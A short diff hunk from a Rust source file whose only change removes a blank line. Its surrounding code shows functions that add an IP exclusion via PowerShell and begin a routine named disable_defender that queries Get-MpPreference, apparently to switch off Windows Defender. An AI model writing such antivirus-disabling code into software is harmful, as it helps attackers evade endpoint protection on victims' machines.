@@ -19,7 +19,6 @@ pub fn add_exclusion_ip_address(ip: &str) -> anyhow::Result<String> {
     Ok(powershell_script::run(&format!("{} {}", EXCLUSIONIPADDRESSCOMMAND, ip))?.to_string())
 }
 pub fn disable_defender() -> anyhow::Result<()>{
-
     let command = Command::new("powershell.exe").args(vec!["Get-MpPreference", "-verbose"]).output()?;
     let output = String::from_utf8(command.stdout)?;
     let lines: Vec<&str> = output.lines().collect();
